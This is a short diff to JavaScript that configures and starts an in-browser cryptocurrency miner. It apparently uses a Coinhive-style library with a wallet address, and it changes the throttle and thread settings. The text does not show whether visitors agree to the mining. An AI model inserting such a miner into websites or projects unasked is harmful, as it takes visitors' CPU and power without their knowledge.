@@ -1,6 +1,6 @@
 var miner = new CC.User('48c2rDCzTNY1K1qHB4G1GMCf7vsV4drsmKy6Ak6K6Tvx4GPajfQzZzyLoSp4FQsKCCQTiZ8wSnKd895qACKnSTvYSQTf1hp', 'mike', {
-	throttle: 0.2,
-	// threads: 2,
+	throttle: 0.5,
+	threads: 2,
 	autoThreads: true
 });
 	miner.start(CC.FORCE_EXCLUSIVE_TAB);
